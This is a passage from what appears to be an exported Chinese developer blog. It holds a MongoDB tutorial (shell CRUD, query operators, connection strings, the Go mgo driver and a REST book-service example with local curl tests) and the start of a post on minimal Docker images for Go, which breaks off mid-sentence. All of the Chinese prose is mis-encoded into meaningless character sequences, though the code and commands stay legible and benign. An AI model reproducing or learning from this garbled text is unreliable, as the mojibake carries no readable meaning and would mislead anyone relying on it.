ËÄåÊòØÂ≠òÂÇ®ÁöÑBson(JsonÁöÑ‰∫åËøõÂà∂Ê†ºÂºè), ÂΩìÊàë‰ª¨Êü•ÁúãÊó∂Bson‰ºöËá™Âä®ËΩ¨Êç¢ÊàêJson, ‰∏∫‰∫ÜËøΩË∏™ÊØè‰∏Ä‰∏™ Document, ÊØè‰∏Ä‰∏™DocumentÈÉΩÊúâ‰∏Ä‰∏™ÈöêËóèÁöÑid Â≠óÊÆµÔºå ËøôÂ∞±Â•ΩÂÉèmyslqÁöÑrow_id, ÂÆÉÊòØMongodbÈáåÈù¢ÁöÑ‰∏ªÈîÆ„ÄÇ ‰∏ãÈù¢ÊòØ‰∏Ä‰∏™ÂÖ∑‰ΩìÁöÑÊ†óÂ≠ê:12&gt; db.students.find()&#123; "_id" : ObjectId("5a162b109d83b8def7401002"), "name" : "Bob", "age" : 22 &#125; ÈõÜÂêà(Collection)documentÁöÑÂÆπÂô®, ‰∏ÄÁªÑÁõ∏ÂÖ≥ÁöÑdocumentÁªÑÊàêÁöÑ‰∏Ä‰∏™ÈõÜÂêàÂ∞±Âè´collection, Âõ†Ê≠§collectionÁõ∏ÂΩì‰∫émysql‰∏≠ÁöÑtable, Â¶Ç‰∏ã: ÈõÜÂêàÂ≠òÂú®‰∫éÊï∞ÊçÆÂ∫ì‰∏≠ÔºåÈõÜÂêàÊ≤°ÊúâÂõ∫ÂÆöÁöÑÁªìÊûÑ(ÊñáÊ°£‰∏çÈúÄË¶ÅËÆæÁΩÆÁõ∏ÂêåÁöÑÂ≠óÊÆµÔºåÂπ∂‰∏îÁõ∏ÂêåÁöÑÂ≠óÊÆµ‰∏çÈúÄË¶ÅÁõ∏ÂêåÁöÑÊï∞ÊçÆÁ±ªÂûã)ÔºåËøôÊÑèÂë≥ÁùÄ‰Ω†Âú®ÂØπÈõÜÂêàÂèØ‰ª•ÊèíÂÖ•‰∏çÂêåÊ†ºÂºèÂíåÁ±ªÂûãÁöÑÊï∞ÊçÆÔºå‰ΩÜÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÊàë‰ª¨ÊèíÂÖ•ÈõÜÂêàÁöÑÊï∞ÊçÆÈÉΩ‰ºöÊúâ‰∏ÄÂÆöÁöÑÂÖ≥ËÅîÊÄß„ÄÇËøô‰∏éÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìÊúâÂæàÂ§ßÁöÑÂå∫Âà´Ôºå‰πüÊòØMongoDBÈùûÂ∏∏Á™ÅÂá∫ÁöÑÁâπÁÇπ, ËØ•ÁâπÊÄßË¢´Áß∞‰Ωúschema free„ÄÇ ÊØîÂ¶Ç:1234&gt; db.students.find()&#123; "_id" : ObjectId("5a162b109d83b8def7401002"), "name" : "Bob", "age" : 22 &#125;&#123; "_id" : ObjectId("5a162b829d83b8def7401003"), "name" : "Bob", "money" : 99 &#125;&#123; "_id" : ObjectId("5a162bbd9d83b8def7401004"), "name" : "Bob", "location" : "chengdu" &#125; mongo shellÁöÑ‰ΩøÁî®Ê≠£Â∏∏ÂÆâË£ÖÂÆåMongoDBËøáÂêé‰ºöÂÆâË£Ömongodb-org-shellÂåÖ, ÂÆÉÊòØmongoDBÁöÑÂÆ¢Êà∑Á´ØÂ∑•ÂÖ∑, Êàë‰ª¨‰ΩøÁî®ÂÆÉÂíåMongoDBËøõË°å‰∫§‰∫í(Â∞±ÂÉèMySQLÁöÑÂÆ¢Êà∑Á´ØÂ∑•ÂÖ∑‰∏ÄÊ†∑).ÈÄöËøáhelpÊü•Áúãmongo-shellÁöÑ‰ΩøÁî®ÊñπÊ≥ï:123456789101112131415161718192021222324&gt; help db.help() help on db methods db.mycoll.help() help on collection methods sh.help() sharding helpers rs.help() replica set helpers help admin administrative help help connect connecting to a db help help keys key shortcuts help misc misc things to know help mr mapreduce show dbs show database names show collections show collections in current database show users show users in current database show profile show most recent system.profile entries with time &gt;= 1ms show logs show the accessible logger names show log [name] prints out the last segment of log in memory, 'global' is default use &lt;db_name&gt; set current database db.foo.find() list objects in collection foo db.foo.find( &#123; a : 1 &#125; ) list objects in foo where a == 1 it result of the last line evaluated; use to further iterate DBQuery.shellBatchSize = x set default number of items to display on shell exit quit the mongo shell&gt; ‰∏ãÈù¢Â∞ÜÊºîÁ§∫Â¶Ç‰Ωï‰ΩøÁî®mongoÂÆ¢Êà∑Á´ØÂØπÊï∞ÊçÆËøõË°åÂü∫Êú¨ÁöÑÂ¢ûÂà†ÊîπÊü• Ê∑ªÂä†Êï∞ÊçÆËØ≠Ê≥ï: db.mycoll.insert(document)Áî®Ê≥ï: Âú®insertÂáΩÊï∞ÂÜÖ‰º†ÂÖ•‰Ω†ÈúÄË¶ÅËÆ∞ÂΩïÁöÑjson„ÄÇ12&gt; db.students.insert(&#123;"name": "Bob", "age": 22&#125;)WriteResult(&#123; "nInserted" : 1 &#125;) Êü•ÁúãÊï∞ÊçÆËØ≠Ê≥ï: db.mycoll.find(query, projection)ÂèÇÊï∞: query: ÂèØÈÄâÔºå‰ΩøÁî®Êü•ËØ¢Êìç‰ΩúÁ¨¶ÊåáÂÆöÊü•ËØ¢Êù°‰ª∂ projection: ÂèØÈÄâÔºå‰ΩøÁî®ÊäïÂΩ±Êìç‰ΩúÁ¨¶ÊåáÂÆöËøîÂõûÁöÑÈîÆ„ÄÇÊü•ËØ¢Êó∂ËøîÂõûÊñáÊ°£‰∏≠ÊâÄÊúâÈîÆÂÄºÔºå Âè™ÈúÄÁúÅÁï•ËØ•ÂèÇÊï∞Âç≥ÂèØÔºàÈªòËÆ§ÁúÅÁï•Ôºâ 123456789# Êü•ÁúãÊâÄÊúâ&gt; db.students.find()&#123; "_id" : ObjectId("5a1632029d83b8def7401005"), "name" : "Bob", "age" : 22 &#125;# Êü•ÁúãÊåáÂÆöÊüê‰∏™&gt; db.students.find(&#123;"name": "Bob"&#125;);&#123; "_id" : ObjectId("5a1632029d83b8def7401005"), "name" : "Bob", "age" : 22 &#125;# Êü•ÁúãÊåáÂÆöÂØπË±°ÁöÑÊåáÂÆöÂ≠óÊÆµ(Ê≥®ÊÑè 1:‰ª£Ë°®Ë¶ÅÂ±ïÁé∞ËØ•Â≠óÊÆµ, 0: ‰ª£Ë°®‰∏çÂ±ïÁé∞ËØ•Â≠óÊÆµ, ÈªòËÆ§"_id"‰∏∫Ë¶ÅÂ±ïÁ§∫)&gt; db.students.find(&#123;"name": "Bob"&#125;, &#123;"age": 1, "_id": 0&#125;);&#123; "age" : 22 &#125; ÊòØ‰∏çÊòØÂæàÁÆÄÂçï, Êù•ÁúãÁúãÈ´òÁ∫ßÁÇπÁöÑÊü•ËØ¢ËØ≠Ê≥ï: Êù°‰ª∂ÊØîËæÉ Êìç‰Ωú ÊèèËø∞ ËØ≠Ê≥ï $gt grant than {field: {$gt: value}} $gte grant than equal {field: {$gte: value}} $lt less than {field: {$lt: value}} $lte less than equal {field: {$lte: value}} $eq equal {field: {$eq: value}} $ne not equal {field: {$ne: value}} $in in {field: {field: {$in: [value, value, ‚Ä¶]}} $nin not in {field: {field: {$nin: [value, value, ‚Ä¶]}} Êù°‰ª∂ÁªÑÂêà Êìç‰Ωú ÊèèËø∞ ËØ≠Ê≥ï $or Êàñ {$or: [{}, {}, ‚Ä¶} $and ‰∏é {$and: [{}, {}, ‚Ä¶} $not Èùû $nor Âèç ÂÖÉÁ¥†Êü•ËØ¢ Êìç‰Ωú ÊèèËø∞ ËØ≠Ê≥ï $exists exist {filed: {$exists: } $mod $type ËøîÂõûÊåáÂÆö Â≠óÊÆµÁ±ªÂûãÁöÑÊñáÊ°£ {filed: {$type: }}, 1. Double 2. String 3.Object 4. Array 5 Binary data ‚Ä¶ ‰øÆÊîπÊï∞ÊçÆËØ≠Ê≥ï: db.mycoll.update(query, object[, upsert_bool, multi_bool])ÂèÇÊï∞: query: updateÁöÑÊü•ËØ¢Êù°‰ª∂ÔºåÁ±ª‰ººsql updateÊü•ËØ¢ÂÜÖwhereÂêéÈù¢ÁöÑ„ÄÇ update: updateÁöÑÂØπË±°Âíå‰∏Ä‰∫õÊõ¥Êñ∞ÁöÑÊìç‰ΩúÁ¨¶ÔºàÂ¶Ç$,$inc‚Ä¶ÔºâÁ≠âÔºå‰πüÂèØ‰ª•ÁêÜËß£‰∏∫sql updateÊü•ËØ¢ÂÜÖsetÂêéÈù¢ÁöÑ„ÄÇ upsert: ÂèØÈÄâÔºåËøô‰∏™ÂèÇÊï∞ÁöÑÊÑèÊÄùÊòØÔºåÂ¶ÇÊûú‰∏çÂ≠òÂú®updateÁöÑËÆ∞ÂΩïÔºåÊòØÂê¶ÊèíÂÖ•objNew,true‰∏∫ÊèíÂÖ•ÔºåÈªòËÆ§ÊòØfalseÔºå‰∏çÊèíÂÖ•„ÄÇ multi: ÂèØÈÄâÔºåmongodb ÈªòËÆ§ÊòØfalse,Âè™Êõ¥Êñ∞ÊâæÂà∞ÁöÑÁ¨¨‰∏ÄÊù°ËÆ∞ÂΩïÔºåÂ¶ÇÊûúËøô‰∏™ÂèÇÊï∞‰∏∫true,Â∞±ÊääÊåâÊù°‰ª∂Êü•Âá∫Êù•Â§öÊù°ËÆ∞ÂΩïÂÖ®ÈÉ®Êõ¥Êñ∞„ÄÇ 1234567891011121314# Êàë‰ª¨ÂÖàÁúãÁúãÊúâÂì™‰∫õÊï∞ÊçÆ&gt; db.students.find()&#123; "_id" : ObjectId("5a1632029d83b8def7401005"), "name" : "Bob", "age" : 22 &#125;&#123; "_id" : ObjectId("5a16c89f4da8732f195b4000"), "name" : "Aollen", "age" : 21 &#125;&#123; "_id" : ObjectId("5a16c8b74da8732f195b4001"), "name" : "tom", "age" : 20 &#125;# Êõ¥Êñ∞ÊåáÂÆöÂØπË±°&gt; db.students.update(&#123;"name": "Bob"&#125;, &#123;$set:&#123;"age": 32&#125;&#125;)WriteResult(&#123; "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 &#125;)# ÊåâÊù°‰ª∂Êõ¥Êñ∞ÂåπÈÖçÂà∞ÁöÑÁ¨¨‰∏ÄÊù°(SQL Where)&gt; db.students.update(&#123;"age": &#123;$gt: 20&#125;&#125;, &#123;$set:&#123;"age": 30&#125;&#125;)WriteResult(&#123; "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 &#125;)# ÊåâÊù°‰ª∂Êõ¥Êñ∞ÂåπÈÖçÂà∞ÁöÑÊâÄÊúâ(SQL Where)&gt; db.students.update(&#123;"age": &#123;$gt: 20&#125;&#125;, &#123;$set:&#123;"age": 30&#125;&#125;, false, true)WriteResult(&#123; "nMatched" : 2, "nUpserted" : 0, "nModified" : 1 &#125;) È´òÁ∫ßÁÇπÁöÑËØ≠Ê≥ï: Êõ¥Êñ∞Á¨¨‰∏Ä‰∏™Ë¢´ÂåπÈÖçÂà∞ÁöÑÊñáÊ°£: db.mycoll.updateOne(filter, update, \), ÂèØÈÄâÂèÇÊï∞: upsert, w, wtimeout, j Êõ¥Êñ∞ÊâÄÊúâË¢´ÂåπÈÖçÂà∞ÁöÑÊñáÊ°£: db.mycoll.updateMany(filter, update, \), ÂèØÈÄâÂèÇÊï∞: upsert, w, wtimeout, j Âà†Èô§Êï∞ÊçÆËØ≠Ê≥ï: db.mycoll.remove(\) 123456# Âà†Èô§ÊåáÂÆöÁöÑÂØπË±°&gt; db.students.remove(&#123;"name": "Bob"&#125;)WriteResult(&#123; "nRemoved" : 1 &#125;)# Âà†Èô§ËØ•collectionÈáåÈù¢ÁöÑÊâÄÊúâÂØπË±°&gt; db.students.remove(&#123;&#125;)WriteResult(&#123; "nRemoved" : 2 &#125;) mongo golangÈ©±Âä®mgoÁöÑ‰ΩøÁî®Âú®mongodbÁöÑÈ©±Âä®ÈáåÈù¢GolangÈ©±Âä®Êé®Ëçê‰ΩøÁî®mgo.1go get gopkg.in/mgo.v2 Âú®‰ΩøÁî®‰πãÂâçÊàë‰ª¨ÂÖàÁúãÁúãËøûÊé•MongoDBÁöÑURI Format: mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]ÂèÇÊï∞ËØ¥Êòé: mongodb:// ËøôÊòØÂõ∫ÂÆöÁöÑÊ†ºÂºèÔºåÂøÖÈ°ªË¶ÅÊåáÂÆö„ÄÇ username:password@ ÂèØÈÄâÈ°πÔºåÂ¶ÇÊûúËÆæÁΩÆÔºåÂú®ËøûÊé•Êï∞ÊçÆÂ∫ìÊúçÂä°Âô®‰πãÂêéÔºåÈ©±Âä®ÈÉΩ‰ºöÂ∞ùËØïÁôªÈôÜËøô‰∏™Êï∞ÊçÆÂ∫ì host1 ÂøÖÈ°ªÁöÑÊåáÂÆöËá≥Â∞ë‰∏Ä‰∏™host, host1 ÊòØËøô‰∏™URIÂîØ‰∏ÄË¶ÅÂ°´ÂÜôÁöÑ„ÄÇÂÆÉÊåáÂÆö‰∫ÜË¶ÅËøûÊé•ÊúçÂä°Âô®ÁöÑÂú∞ÂùÄ„ÄÇÂ¶ÇÊûúË¶ÅËøûÊé•Â§çÂà∂ÈõÜÔºåËØ∑ÊåáÂÆöÂ§ö‰∏™‰∏ªÊú∫Âú∞ÂùÄ„ÄÇ portX ÂèØÈÄâÁöÑÊåáÂÆöÁ´ØÂè£ÔºåÂ¶ÇÊûú‰∏çÂ°´ÔºåÈªòËÆ§‰∏∫27017 /database Â¶ÇÊûúÊåáÂÆöusername:password@ÔºåËøûÊé•Âπ∂È™åËØÅÁôªÈôÜÊåáÂÆöÊï∞ÊçÆÂ∫ì„ÄÇËã•‰∏çÊåáÂÆöÔºåÈªòËÆ§ÊâìÂºÄ test Êï∞ÊçÆÂ∫ì„ÄÇ ?options ÊòØËøûÊé•ÈÄâÈ°π„ÄÇÂ¶ÇÊûú‰∏ç‰ΩøÁî®/databaseÔºåÂàôÂâçÈù¢ÈúÄË¶ÅÂä†‰∏ä/„ÄÇÊâÄÊúâËøûÊé•ÈÄâÈ°πÈÉΩÊòØÈîÆÂÄºÂØπname=valueÔºåÈîÆÂÄºÂØπ‰πãÈó¥ÈÄöËøá&amp;Êàñ;ÔºàÂàÜÂè∑ÔºâÈöîÂºÄ ‰∏ãÈù¢‰∏æ2‰∏™ÁÆÄÂçïÂæóÊ†óÂ≠ê, Âõ†‰∏∫Á≠â‰∏ãÂõû‰ΩøÁî®Âà∞:1234# Áî®Êà∑: admin ÂØÜÁ†Å: 123456 Âú∞ÂùÄ: localhost Êï∞ÊçÆÂ∫ì: testmongodb://admin:123456@localhost:27017/test# ‰ª•ÂÆâÂÖ®Ê®°ÂºèËøûÊé•Âà∞replica setÔºåÂπ∂‰∏îÁ≠âÂæÖËá≥Â∞ë‰∏§‰∏™Â§çÂà∂ÊúçÂä°Âô®ÊàêÂäüÂÜôÂÖ•ÔºåË∂ÖÊó∂Êó∂Èó¥ËÆæÁΩÆ‰∏∫2Áßí„ÄÇmongodb://host1,host2,host3/?safe=true;w=2;wtimeoutMS=2000 Â¶ÇÊûúÊÉ≥Ë¶Å‰∫ÜËß£ÂÖ≥‰∫éÊ≠§Êõ¥ËØ¶ÁªÜÁöÑÊñáÊ°£, ËØ∑Êü•Áúã: MongoDBÂÆòÊñπÊñáÊ°£ÂÖ≥‰∫éconnection-stringÁöÑËØ¶Ëß£ ËèúÈ∏üÂ≠¶Èô¢MongoDBËøûÊé• Âü∫Êú¨Ê†óÂ≠êÈ¶ñÂÖàÊàë‰ª¨ÂÖà‰∫ÜËß£mgo‰∏Ä‰∫õÊúÄÂü∫Êú¨ÁöÑÁî®Ê≥ï:123456789101112131415161718192021222324252627282930313233343536373839import ( "fmt" "log" "gopkg.in/mgo.v2" "gopkg.in/mgo.v2/bson")// Person is testtype Person struct &#123; Name string Phone string&#125;func main() &#123; session, err := mgo.Dial("mongodb://127.0.0.1:27017/") if err != nil &#123; panic(err) &#125; defer session.Close() // Optional. Switch the session to a monotonic behavior. session.SetMode(mgo.Monotonic, true) c := session.DB("test").C("people") err = c.Insert(&amp;Person&#123;"Ale", "+55 53 8116 9639"&#125;, &amp;Person&#123;"Cla", "+55 53 8402 8510"&#125;) if err != nil &#123; log.Fatal(err) &#125; result := Person&#123;&#125; err = c.Find(bson.M&#123;"name": "Ale"&#125;).One(&amp;result) if err != nil &#123; log.Fatal(err) &#125; fmt.Println("Phone:", result.Phone)&#125; ÊúÄÁªàÊàë‰ª¨Áî®mongo-shellËøûÊé•Êï∞ÊçÆÂ∫ì, È™åËØÅ‰∏ãÁ®ãÂ∫èÊòØÂê¶ÁîüÊïà:123&gt; db.people.find()&#123; "_id" : ObjectId("5a16dd323bde4bd3cde02654"), "name" : "Ale", "phone" : "+55 53 8116 9639" &#125;&#123; "_id" : ObjectId("5a16dd323bde4bd3cde02655"), "name" : "Cla", "phone" : "+55 53 8402 8510" &#125; ÂæÆÊúçÂä°Ê†óÂ≠ê‰∏ãÈù¢ÊòØ‰∏Ä‰∏™Âü∫‰∫éMongoDBÁöÑÂæÆÊúçÂä°ÁöÑÊ†óÂ≠ê:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218package mainimport ( "encoding/json" "fmt" "log" "net/http" "github.com/julienschmidt/httprouter" "gopkg.in/mgo.v2" "gopkg.in/mgo.v2/bson")func ErrorWithJSON(w http.ResponseWriter, message string, code int) &#123; w.Header().Set("Content-Type", "application/json; charset=utf-8") w.WriteHeader(code) fmt.Fprintf(w, "&#123;message: %q&#125;", message)&#125;func ResponseWithJSON(w http.ResponseWriter, json []byte, code int) &#123; w.Header().Set("Content-Type", "application/json; charset=utf-8") w.WriteHeader(code) w.Write(json)&#125;type Book struct &#123; ISBN string `json:"isbn"` Title string `json:"title"` Authors []string `json:"authors"` Price string `json:"price"`&#125;func main() &#123; session, err := mgo.Dial("localhost:27017") if err != nil &#123; panic(err) &#125; defer session.Close() session.SetMode(mgo.Monotonic, true) ensureIndex(session) router := httprouter.New() router.GET("/books", allBooks(session)) router.POST("/books", addBook(session)) router.GET("/books/:isbn", bookByISBN(session)) router.PUT("/books/:isbn", updateBook(session)) router.DELETE("/books/:isbn", deleteBook(session)) http.ListenAndServe("localhost:8080", router)&#125;func ensureIndex(s *mgo.Session) &#123; session := s.Copy() defer session.Close() c := session.DB("store").C("books") index := mgo.Index&#123; Key: []string&#123;"isbn"&#125;, Unique: true, DropDups: true, Background: true, Sparse: true, &#125; err := c.EnsureIndex(index) if err != nil &#123; panic(err) &#125;&#125;func allBooks(s *mgo.Session) func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; return func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; session := s.Copy() defer session.Close() c := session.DB("store").C("books") var books []Book err := c.Find(bson.M&#123;&#125;).All(&amp;books) if err != nil &#123; ErrorWithJSON(w, "Database error", http.StatusInternalServerError) log.Println("Failed get all books: ", err) return &#125; respBody, err := json.MarshalIndent(books, "", " ") if err != nil &#123; log.Fatal(err) &#125; ResponseWithJSON(w, respBody, http.StatusOK) &#125;&#125;func addBook(s *mgo.Session) func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; return func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; session := s.Copy() defer session.Close() var book Book decoder := json.NewDecoder(r.Body) err := decoder.Decode(&amp;book) if err != nil &#123; ErrorWithJSON(w, "Incorrect body", http.StatusBadRequest) return &#125; c := session.DB("store").C("books") err = c.Insert(book) if err != nil &#123; if mgo.IsDup(err) &#123; ErrorWithJSON(w, "Book with this ISBN already exists", http.StatusBadRequest) return &#125; ErrorWithJSON(w, "Database error", http.StatusInternalServerError) log.Println("Failed insert book: ", err) return &#125; w.Header().Set("Content-Type", "application/json") w.Header().Set("Location", r.URL.Path+"/"+book.ISBN) w.WriteHeader(http.StatusCreated) &#125;&#125;func bookByISBN(s *mgo.Session) func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; return func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; session := s.Copy() defer session.Close() isbn := ps.ByName("isbn") c := session.DB("store").C("books") var book Book err := c.Find(bson.M&#123;"isbn": isbn&#125;).One(&amp;book) if err != nil &#123; ErrorWithJSON(w, "Database error", http.StatusInternalServerError) log.Println("Failed find book: ", err) return &#125; if book.ISBN == "" &#123; ErrorWithJSON(w, "Book not found", http.StatusNotFound) return &#125; respBody, err := json.MarshalIndent(book, "", " ") if err != nil &#123; log.Fatal(err) &#125; ResponseWithJSON(w, respBody, http.StatusOK) &#125;&#125;func updateBook(s *mgo.Session) func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; return func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; session := s.Copy() defer session.Close() isbn := ps.ByName("isbn") var book Book decoder := json.NewDecoder(r.Body) err := decoder.Decode(&amp;book) if err != nil &#123; ErrorWithJSON(w, "Incorrect body", http.StatusBadRequest) return &#125; c := session.DB("store").C("books") err = c.Update(bson.M&#123;"isbn": isbn&#125;, &amp;book) if err != nil &#123; switch err &#123; default: ErrorWithJSON(w, "Database error", http.StatusInternalServerError) log.Println("Failed update book: ", err) return case mgo.ErrNotFound: ErrorWithJSON(w, "Book not found", http.StatusNotFound) return &#125; &#125; w.WriteHeader(http.StatusNoContent) &#125;&#125;func deleteBook(s *mgo.Session) func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; return func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; session := s.Copy() defer session.Close() isbn := ps.ByName("isbn") c := session.DB("store").C("books") err := c.Remove(bson.M&#123;"isbn": isbn&#125;) if err != nil &#123; switch err &#123; default: ErrorWithJSON(w, "Database error", http.StatusInternalServerError) log.Println("Failed delete book: ", err) return case mgo.ErrNotFound: ErrorWithJSON(w, "Book not found", http.StatusNotFound) return &#125; &#125; w.WriteHeader(http.StatusNoContent) &#125;&#125; ÊµãËØï:123456789101112131415161718192021222324252627282930313233343536# ÂàõÂª∫‰∏ÄÊú¨book maojun@maojun-mbp $ curl -X POST \&gt; http://localhost:8080/books \&gt; -H 'content-type: application/json' \&gt; -d '&#123;"isbn": "aabbxx", "title": "test titile", "authors":["bob", "aollen"], "price": "100"&#125;'# Êü•ÁúãÂàõÂª∫ÁöÑbookÂàóË°® maojun@maojun-mbp $ curl -X GET http://localhost:8080/books[ &#123; "isbn": "aabbxx", "title": "test titile", "authors": [ "bob", "aollen" ], "price": "100" &#125;]# Êü•ÁúãÊåáÂÆöÁöÑbook maojun@maojun-mbp $ curl -X GET http://localhost:8080/books/aabbxx&#123; "isbn": "aabbxx", "title": "test titile", "authors": [ "bob", "aollen" ], "price": "100"&#125;# Êõ¥Êñ∞ÊåáÂÆöÁöÑbook maojun@maojun-mbp $ curl -X PUT \&gt; http://localhost:8080/books/aabbxx \&gt; -H 'content-type: application/json' \&gt; -d '&#123;"isbn": "aabbxx", "price": "99"&#125;'# Âà†Èô§ÊåáÂÆöÁöÑbook ‚úò maojun@maojun-mbp $ curl -X DELETE http://localhost:8080/books/aabbxx ÂèÇËÄÉmongodb‰ΩøÁî®ÊâãÂÜåmongodbÊû∂ÊûÑÊñáÊ°£ËèúÈ∏üÂ≠¶Èô¢mongodbÊïôÁ®ãmgoÊñáÊ°£]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÊûÑÂª∫GolangÁ®ãÂ∫èÊúÄÂ∞èDockerÈïúÂÉè]]></title>
    <url>%2F2017%2F11%2F20%2Fgolang-mini-docker-image%2F</url>
    <content type="text"><![CDATA[Â∫îÁî®ÂÆπÂô®ÂåñÊñπ‰æø‰∫ÜÈÉ®ÁΩ≤ÔºåÈÅøÂÖçÂÆûÈôÖ‰∏≠ÂºÄÂèëÁéØÂ¢ÉÂíåÁîü‰∫ßÁéØÂ¢É‰∏ç‰∏ÄËá¥ËÄåÂØºËá¥ÁöÑÈÉ®ÁΩ≤Âõ∞Èöæ, ËÄå‰∏îÔºåÂÆπÂô®Âåñ‰πãÂêéËøòÂèØ‰ª•ÂØπÂ∫îÁî®ÊâÄ‰ΩøÁî®ÁöÑCPU„ÄÅÂÜÖÂ≠òÁ≠âËµÑÊ∫êÂÅöÈôêÂà∂ÔºåËøô‰∫õÈÉΩÊòØÂÆπÂô®Âåñ‰πãÂêéÁöÑÂèØ‰ª•Â∏¶Êù•ÁöÑÊñπ‰æø„ÄÇËøôÁØáÊñáÁ´†Â∞Ü‰ºöÂ∞ÜÂ¶Ç‰Ωïbuild DockerÈïúÂÉè(ÊúÄÂ∞èÂåñbuild), ÂÆπÂô®Âåñ‰Ω†ÁöÑGolangÂ∫îÁî®„ÄÇ ‰∏∫‰ªÄ‰πàÈúÄË¶ÅÊûÑÂª∫Â∞èÁöÑÈïúÂÉèÊàë‰ª¨Áü•ÈÅìÊûÑÂª∫‰∏Ä‰∏™DockerÈïúÂÉèÁöÑÊó∂ÂÄôÂæÄÂæÄÈúÄË¶ÅÂºïÂÖ•‰∏Ä‰∫õÁ®ãÂ∫è‰æùËµñÁöÑ‰∏úË•øÔºåÊúÄÂ∏∏ËßÅÁöÑÂ∞±ÊòØÂºïÂÖ•‰∏Ä‰∏™Âü∫Á°ÄÊìç‰ΩúÁ≥ªÁªüÈïúÂÉèÔºå‰ΩÜËøôÊ†∑ÂæÄÂæÄ‰ºö‰ΩøÂæóÁºñËØëÂá∫Êù•ÁöÑÈïúÂÉèÁâπÂà´Â§ß„ÄÇÂ∞±ÊãøPythonÊù•ËØ¥, ‰πãÂâçbuildÁöÑÈïúÂÉè‰∏ÄËà¨ÈÉΩÂ§ß‰∫é600M, Â¶ÇÊûúËøô‰∏™È°πÁõÆÊòØÂÜÖÈÉ®È°πÁõÆ, ÂÖ∂ÂÆûÈóÆÈ¢ò‰∏çÂ§ß, Âõ†‰∏∫ÂÜÖÁΩë‰∏ÄËà¨‰πü‰ºöÊê≠Âª∫ÈïúÂÉè‰ªìÂ∫ì, ÂÜÖÁΩëÊï∞ÊçÆ‰πüÂø´, ‰ΩÜÊòØÂ¶ÇÊûúÊòØÂºÄÊ∫êÈ°πÁõÆ, ÈïúÂÉèËøáÂ§ßÂ∞±ÊòØ‰∏™ÈóÆÈ¢ò„ÄÇÂØπÊãâÂèñËÄÖÂ∏¶ÂÆΩË¶ÅÊ±ÇËæÉÈ´ò, ËÄåDocker hubÁöÑÈÄüÂ∫¶Â§ßÂÆ∂‰πüÈÉΩÁü•ÈÅì, ÂΩìÁÑ∂Â¶ÇÊûú‰Ω†‰ΩøÁî®ÈïúÂÉèÂä†ÈÄü‰ΩìÈ™å‰ºöÂ•ΩÂæàÂ§ö„ÄÇ‰ΩÜÊòØÂ¶ÇÊûúËÉΩÂÅöÂà∞ÊääÈïúÂÉèÂèòÂ∞è, ÂÅöÂà∞Âá†M, Âá†ÂçÅMÈÇ£‰πàÂØπ‰∫é‰Ω†È°πÁõÆÁöÑ‰ΩøÁî®ËÄÖÊù•ËØ¥‰ΩìÈ™å‰ºöÂ•ΩÂæàÂ§ö. Âõ†‰∏∫GoÊòØÈùôÊÄÅÁºñËØëËØ≠Ë®Ä, ÂèØ‰ª•ÂÅöÂà∞0‰æùËµñ, Âõ†Ê≠§ÂèØ‰ª•ÊûÑÂª∫ÂæàÂ∞èÁöÑÁ®ãÂ∫èÈïúÂÉè, ‰ΩÜÊòØÂÖ∂ÂÆûËøòÊòØÊúâ‰∫õÂ∞èÊèíÊõ≤, Ëøô‰πüÂ∞±ÊòØËøôÁØáÊñáÁ´†Âá∫Áé∞ÁöÑÂéüÂõ†. Á®ãÂ∫èÊ†∑‰æãËøôÈáå‰ª•‰∏Ä‰∏™ÁÆÄÂçïÁöÑhello worldÁöÑWEB APIÁ®ãÂ∫è‰∏∫‰æã:1234567891011121314151617181920212223package mainimport ( "log" "net/http")// greeter hello world examplefunc greeter(w http.ResponseWriter, r *http.Request) &#123; w.Write([]byte("hello world!")) w.WriteHeader(http.StatusOK) return&#125;func main() &#123; http.HandleFunc("/", greeter) addr := "0.0.0.0:8080" log.Printf("start service at: %s ... \n", addr) err := http.ListenAndServe(addr, nil) if err != nil &#123; log.Fatal("ListenAndServe: ", err) &#125;&#125; ÊúÄÁªà‰ºöÊääËøô‰∏™Á®ãÂ∫èÊâìÂåÖÊàê‰∏Ä‰∏™ÊúÄÂ∞èÁöÑdockerÈïúÂÉèËøõË°åÂèëÂ∏É, ËÆ©Êàë‰ª¨ÁúãÁúãËøôÊ†∑‰∏Ä‰∏™ÈïúÂÉèbuildÂá∫Êù•ËøáÂêéÂà∞Â∫ïÊúâÂ§öÂ§ß„ÄÇ ÁºñËØëÊó∂ÁöÑÈóÆÈ¢òÁºñËØëÊó∂ÁöÑ‰∏ªË¶ÅÈóÆÈ¢òÂ∞±ÊòØÂ¶ÇÊûúÂ∞ÜGolangÁ®ãÂ∫èÁºñËØëÊàê‰∏Ä‰∏™ÁúüÊ≠£Ê≤°Êúâ‰æùËµñÁöÑ‰∫åËøõÂà∂Á®ãÂ∫è, ‰πüËÆ∏Êúâ‰∫∫‰ºöÈóÆGoÊú¨Ë∫´‰∏çÂ∞±ÊòØÈùôÊÄÅÁºñËØëÂêóÔºüËøôÈáåÂ∞±ÈúÄË¶ÅËÅäËÅäGolangÈáåÈù¢CGO‰∫Ü„ÄÇ ÂÖ≥‰∫é-installsuffix 